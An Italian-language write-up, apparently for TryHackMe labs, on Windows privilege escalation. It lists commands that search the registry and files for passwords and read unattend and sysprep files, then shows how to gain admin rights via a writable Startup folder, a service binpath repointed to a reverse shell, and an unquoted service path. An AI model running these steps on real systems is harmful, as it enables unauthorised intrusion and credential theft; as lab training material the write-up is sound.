---
title: Privilege Escalation Widnows
categories: [TryHackMe, WriteUp]
tags: [TryHackMe, WriteUp]
---

# Privilege Escalation Windows

Presi da https://hacktips.it/guida-privilege-escalation-sistemi-windows/
**CAMBIARE IMMAGINI E TESTO**

### Collect Information
 - Versione del sistema operativo e informazioni base
   - ```systeminfo | findstr /B /C:“OS Name” /C:“OS Version”```
   - ```hostname```
   - ```echo %username%```
 - Configurazioni di rete
   - ```net users```
   - ```net users usersname```
   - ```ipconfig /all```
   - ```route print```
   - ```arp -A```
   - ```netstat -ano```
 - Servizi attivi
   - ```schtasks /query /fo LIST /v```
   - ```tasklist /SVC```
   - ```net start```
 - File di configurazione
   - ```type C:\sysprep.inf```
   - ```type C:\sysprep\sysprep.xml```
   - ```type %WINDIR%\Panther\Unattend\Unattended.xml```
   - ```type %WINDIR%\Panther\Unattended.xml```
   - ```type C:\Windows\system32\sysprep\sysprep.xml```
   - ```type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config```
   - ```type C:\inetpub\wwwroot\web.config```
 - Ricerca Password
   - ```reg query HKCU /f password /t REG_SZ /s```
   - ```reg query HKLM /f password /t REG_SZ /s```
   - ```findstr /si password *.txt```
   - ```findstr /si password *.xml```
   - ```findstr /si password *.ini```


### Weak Permission

```cacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"```


![calcs](/assets/img/posts/privesc-windows/weak_permission.png)

si può vedere dalla prima riga, che gli utenti appartenenti a “User” hanno completo accesso alla cartella (lettera F). In questo modo, basterà copiare la nostra reverse shell all’interno della cartella, riavviare la macchina (o disconnettersi dallla sessione) e si avrà una sessione amministrativa


### Weak Service

Utilizzando lo script di **PowerUp** abbiamo la possibilità di cercare servizi vulnerabili. Per eseguirlo, se digito

```powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks|Out-File -Encoding ASCII checks.txt}"```

verrà eseguito powershell, bypassando possibili controlli, in background e in modo tale da avere l’output scritto su un file di testo. Guardando all’interno del file, è stato controllato un servizio ed è risultato con permessi misconfigurati.

![Weak Service - Powershell](/assets/img/posts/privesc-windows/weak_service1.png)

Per verificare i permessi del servizio, carico sulla macchina **AccessChk**, che serve per verificare i permessi sui file, registri, servici, etc.

![Weak Service - AccessChk](/assets/img/posts/privesc-windows/weak_service2.png)

Come si può notare dall’immagine, chiunque può modificare i dettagli del servizio. Andiamo quindi ad indagare quali sono con il tools sc.

![Weak Service](/assets/img/posts/privesc-windows/weak_service3.png)


Per poter ottenere i privilegi di root, ci basterà modificare il PATH del binario con una nostra reverse shell, fermare e riavviare il servizio. In questo modo esso si avvierà come amministratore, e ci permetterà di diventare tali.


```sc config daclsvc binpath= "C:\Users\luca\Downloads\reverse.exe"```

```sc stop daclsvc #In questo momento andremo ad avviare netcat sulla nostra macchina```

```sc start daclsvc```


### Unquoted Service Path

Sempre tramite l’outpur di **PowerUP**, viene mostrato come vari servizi non abbiano le virgolette, andando a descrivere il path errato.

![Unquoted Service Path - PowerUP](/assets/img/posts/privesc-windows/unquoted_path1.png)

In questo modo, basterà andare a a copiare un file con il nome di “common” e questo verrà eseguito, poichè il sistema andrà a cercarne uno con quel nome.

![Unquoted Service Path](/assets/img/posts/privesc-windows/unquoted_path2.png)

Copio la mia solita reverse shell, mi metto in ascolto sulla porta e faccio partire il servizio

```sc stop unquotedsvc```

```sc start unquotedsvc```


![Unquoted Service Path - Powershell](/assets/img/posts/privesc-windows/unquoted_path3.png)
